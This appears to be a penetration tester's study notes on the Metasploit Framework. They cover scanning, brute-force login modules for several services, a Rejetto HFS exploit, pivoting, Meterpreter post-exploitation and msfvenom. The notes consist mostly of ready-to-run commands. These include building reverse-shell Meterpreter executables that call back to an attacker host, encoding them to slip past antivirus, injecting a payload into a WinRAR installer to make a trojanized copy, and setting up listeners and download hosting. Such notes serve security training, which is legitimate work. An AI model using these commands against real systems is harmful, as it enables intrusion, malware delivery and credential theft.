Metasploit Framework
# Table of Contents
1. [Overview](#Overview)
2. [Architecture](#Architecture)
	1. Interfaces
	2. Modules
		1. Meterpreter Payload
	3. Libraries
	4. Diagram
	5. The Penetration Testing Execution Standard (PTES)
3. [Usage](#Usage)
	1. nmap importing or running scan
	2. Auxiliary Modules
	3. [Workflow Examples](#Workflow_Examples)
		1. [FTP](#FTP)
		2. [SMB](#SMB)
		3. [MYSQL](#MYSQL)
		4. [SSH](#SSH)
		5. [SMTP](#SMTP)
	4. [Vulnerability Scanning](#Vulnerability_Scanning)
	5. [Meterpreter](#Meterpreter)
	6. [msfvenom](#msfvenom)
	7. Automation
	8. Show information gathered


---

# Overview

- Interface : Methods of interacting with the MSF
- Module : pieces of code that perform a particular task such as an exploit
- Vulnerability : Weakness or flaw in a system that can be exploited
- Exploit : Piece of code/module that is used to take advantage of a vulnerability
- Payload: piece of code delivered to the target by an expoit with the objective of executing arbitrary commands or providing remote access to attacker.
- Listener : a utility that listens for an incoming connection from a target

---

# Architecture
## Interfaces
- `msfconsole` : All in one interface to the MSF
- `MSFcli` : Command line interface that is useful for scripting, deprecated in 2015 and the functionality migrated into the MSFconsole.
- Armitage : A free java based GUI for the MSF
- Web : web interface

## Modules
A module is a piece of code that can be utilized by the MSF. Libraries facilitate the execution of modules.
- Exploit : A module use to take advantage, usually paired with a payload
- Payload : code delivered to target to take advantage, example is reverse shell
	- Non-staged : payload that is sent to target along with the exploit
	- Staged Payload : first payload contains reverse shell, second part is then downloaded and executed
		- Stagers : used to establish stable connection
		- Stage: payload components that are downloaded
- Encoder : used to encode payloads in order to avoid AV detection
- NOP : used to ensure that payloads sizes are consistent and stability
- Auxiliary : used to perform additional functionality like port scanning and enumeration
### Meterpreter Payload
The meterpreter (meta-interpreter) payload is an advanced multi-functional payload that is executed in memory on the target system. It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file navigation and manipulation key-logging, and etc...

## Libraries
- Rex
- MSF Core
- MSF Base

## Diagram
```
 Tools --------> Rex
                 /\
              MSF Core
                 /\
 Plugins ---> MSF Base <------- Interfaces
                 /\
              Modules
```


---

## The Penetration Testing Execution Standard (PTES)
http://www.pentest-standard.org/index.php/Main_Page

| Penetration Testing Phase           | Metasploit Framework Implementation    |
| ----------------------------------- | -------------------------------------- |
| Information Gathering & Enumeration | Auxiliary Modules                      |
| Vulnerability Scanning              | Auxiliary Modules, Nessus              |
| Exploitation                        | Exploit Modules & Payloads             |
| Post Exploitation                   | Meterpreter                            |
| Privilege Escalation                | Post Exploitation Modules, Meterpreter |
| Maintaining Persistent Access       | Post Exploitation Modules, Persistence |

---

# Usage

## nmap importing or running scan
- `workspace -a Test` : add a new workspace
- `db_import /root/winserver.xml` : import an nmap scan
- `hosts` : show hosts
- `services` : show services detected on the hosts
- `db_nmap -Pn -sV -O` : run and import an nmap scan 
- You can import from a nessus scan ScanFile.nessus

## Auxiliary Modules
- `search portscan` : bring up scanner modules
- `use auxiliary/scanner/portscan/tcp`
- `show options` : check the options
- `set rhosts` : set target
- get access to target 1 and once you have a meterpreter session spawn a shell and `/bin/bash -i` to get bash and then run ifconfig to grab the information of the second network. exit shell
- `run autoroute -s 192.113.124.2` : in meterpreter add route to the network
- drop to background
- load portscan and set rhosts to the 2nd system
- once run, the portscan will be routed through the first machine
- auxiliary/scanner/discovery/udp_sweep : another module to do UDP port sweep

---

## Workflow_Examples

### #FTP
[Service info - FTP](../Services/FTP.md)
1. `search type:auxiliary name:ftp` : find scanner for ftp version
	1. use module on target to get service version
2. `search type:auxiliary name:ftp` : ftp_login for brute forcing
	1. set user file and pass file

### #SMB
[Service info - SMB](../Services/SMB.md)
1. `search type:auxiliary name:smb` : smb_version scanner
	1. use to enumerate smb on target
2. `search type:auxiliary name:smb` : smb_enumusers
	1. `info` give information on the module
3. `search type:auxiliary name:smb` : smb_enumshares
4. smb_login : brute force login
	1. can set user to admin discovered and then try passfile
5. use [smbclient](../Services/SMB.md#smbclient) to login

### #WebServer
[Service info - HTTP](../Services/HTTP.md)
1. `search type:auxiliary name:http` : http_version
	1. use to find the service version
2. `search type:auxiliary name:http` : http_header
	1. grabs methods and header information
3. `search type:auxiliary name:http` : robots_txt
	1. finds information for the robots file
	2. `curl` a dir to check it out
4. dir_scanner : find directories
	1. `set DICTIONARY` 
	2. `set PATH` 
5. files_dir : find files in directories
6. apache_userdir_enum : look at info
	1. `set USER_FILE /wordlists/common_users.txt`
	2. find valid users then create a custom file to use below with users. This will let you narrow down without having to brute force nonexistent users
7. `search type:auxiliary name:http_login` : brute force login
	1. `set AUTH_URI` : target dir
	2. might need to `unset userpass_file` if providing separately
	3. `set verbose false`
	4. `set USER_FILE /usr/share/metaspolit-framework/data/wordlists/namelist.txt`
	5. `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

### #MYSQL
[Service info - SQL](../Services/SQL.md)
1. `search type:auxiliary name:mysql` : mysql_version
	1. grab version information
2. `search mysql_login` : brute force login
	1. set userpass_file and user info
3. `search mysql_enum` : needs credentials
	1. set *username* and *password*
4. `search mysql_sql` : needs credentials
	1. allows to execute sql queries
	2. `set SQL "SHOW DATABASES;"`
5. `search mysql_schemadump` : needs credentials
	1. displays schema information

### #SSH
[Service info - SSH](../Services/SSH.md)
1. `serach type:auxiliary name:ssh` : ssh_version
	1. grab version information
2. ssh_enumusers : enumerate users
3. `serach type:auxiliary name:ssh` : ssh_login
	1. brute force password login

### #SMTP
[Service info - SMTP](../Services/SMTP.md)
1. `serach type:auxiliary name:smtp` : smtp_version
	1. grab version information
2. `serach type:auxiliary name:smtp` : smtp_enum
	1. performs user enumeration

### #HTTP
[Service info - HTTP](../Services/HTTP.md)
1. nmap scan to find *HttpFileServer* running, this is *rejetto*
2. `search type:exploit name:rejetto` : find exploit
3. `use exploit/windows/http/rejetto_hfs_exec`
	1. `set RHOST` : set target
	2. `set payload windows/...` : can override default


---

## Vulnerability_Scanning

Finding vulnerabilities that can be exploited
1. scan target to find services and versions
	1. nmap or MSF module
2. search for services
	1. `serach smb` : isnide MSF
	2. `searchsploit "windows smb" | grep -ei "metasploit"`
	3. can find scanner to check for specific exploit vulnerability
3. `analyze` : will analyze based on data in DB
	1. `vulns` : will list out detected vulnerabilities
4. autopwn plugin
	1. GitHub hahwul/metasploit-autopwn
	2. `load db_autopwn`
	3. `db_autopwn -p -t`
5. Can use Nessus and then import results from Nessus export
6. `search cve:2017 name:smb`

### WMAP
1. `load wmap` : load the wmap module
2. `wmap_` : use tab complete to see all options
3. `wmap_sites -a targetIP` : add a target to sites
4. `wmap_targets -h` : view options
5. `wmap_run -h` : view options
6. `wmap_run -t` : show modules that will run
7. `wmap_run -e` : start testing

---

## Meterpreter
### Post exploitation
In a meterpreter session
- `sysinfo` : system info
- `getuid` : get user info
- `help` : display commands
- `ctrl-z` : background : send to bg
- sessions -h : session help menu
- `sessions -C sysinfo -i 1` : run command on session 1
- `sessions -n test -i 1` :name the session
- `search -d /usr/bin -f "flag*"` :  search in directory for filename
- `shell` : spawn native shell on OS
	- `ctrl-c` : terminate "channel" drop shell and go back to meterpreter
- `ps` : show processes running
- `migrate 580` : try to migrate to the process "PID" at 580, based on privileges
- `execute -f ifconfig` : execute a command

### Upgrade shell to meterpreter
1. `sessions -u 1` : Auto upgrade cmd shell at session 1 to meterpreter
2. `search shell_to_meterpreter` : manually control it
	1. `set SESSION 1` : set target session
	2. `set LHOST eth1` : set local host
	4. `run`

---

## msfvenom
### Generating_Payloads
- `msfvenom --list payloads | less` : list out all the payloads
	- staged has more sub dirs
		- `windows/x64/meterpreter/reverse_tcp` : os/cpu-arch/type/connection-type
	- non staged is shorter
		- `windows/x64/meterpreter_bind_tcp` : os/cpu-arch/payload
- `msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 -f exe > /home/kali/Desktop/paylodx86.exe`
	- -a : architecture
	- -p : payload : can auto-select based on payload
	- -f : filetype/formats
	- local-host and local-port of the attacker to reverse back to

### Encoding_Payloads
Encoding a payload helps to avoid antivirus solutions with signature based detection.
- `msfvenom --list encoders | less` : list out all the encoders
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 -i 5 -e x86/shikataga_nai -f exe > /payloadx86.exe`
	- -e : specify encoder when generating
	- -i : iterations to run on encoder

### Injecting_Payloads
Inject a payload into a windows executable file to avoid detection
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 -e x86/shikata_ga_nai -i 8 -f exe -x ~/Downloads/wrar602.exe > ~/Downloads/Windows_payloads/winrar.exe
```
- -x : template file for injection
- -k : will maintain the original function of the file : most files don't work!

### Handler
1. `msfconsole`
	1. `use multi/handler`
	2. `set payload windows/meterpreter/reverse/tcp` : payload you generated
	3. `set LHOST ipaddr` : ip you set for local host
	4. `set LPORT ipaddr` : port you set for local port
2. `run post/windows/manage/migrate` : will attempt to migrate to new process

### Hosting_Download
`python -m SimpleHTTPServer 8080` : python module for basic http server on port 8080

---

## Automation
Metasploit Resource Scripts are great for creating automation scripts
- `/usr/share/metasploit-framework/scripts/resource/`
	- contains a collection of built in scripts
- Example for setting up handler "handler.rc"
```ruby
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```
- `msfconsole -r handler.rc` : load and run the script
- msf6 > `resource /handler.rc` : can call script within metasploit framework

---

## Show information gathered
Depends on workspace and modules ran within
- `hosts`
- `services`
- `loot` : shows stuff like schema gathered
- `creds` : shows credentials
- `vulns -p 445` : can show discovered vulnerabilities and filter by port
- `search cve:2017 name:smb` : search for cve year and name
